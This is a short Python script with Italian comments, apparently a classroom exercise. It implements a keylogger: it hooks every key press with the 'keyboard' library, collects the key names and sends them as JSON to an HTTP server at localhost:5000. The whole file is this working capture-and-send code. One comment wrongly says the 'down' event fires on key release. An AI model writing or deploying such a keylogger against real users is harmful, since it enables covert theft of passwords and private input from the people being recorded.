import time
import keyboard # keyboard viene utilizzato per ascoltare gli input
import json # traduce i dati in formato json (formato standard per l'invio di messaggi in HTTP)
import requests # permette l'invio di messaggi HTTP

start_time = time.time() # imposta il tempo iniziale al momento in cui viene avviato il programma
recorded_keystrokes = []

def pressed_keys(e):
    if e.event_type == 'down': # si attiva solo al rilascio del tasto premuto (per evitare ridondanze)
        recorded_keystrokes.append(e.name) # aggiunge alla lista dei tasti premuti il tasto

while time.time() - start_time < 10: # A fini di esercizio, si impone il riavvio dell'ascolto per 10 secondi, anche nel caso venga premuto il tasto "Esc"
    keyboard.hook(pressed_keys) # aggancia la funzione agli input registrati dalla tastiera
    keyboard.wait('esc') # disattiva l'ascolto fino al tasto "Esc"

    request = requests.get('http://localhost:5000', data=json.dumps(recorded_keystrokes)) # invia il messaggio al server in ascolto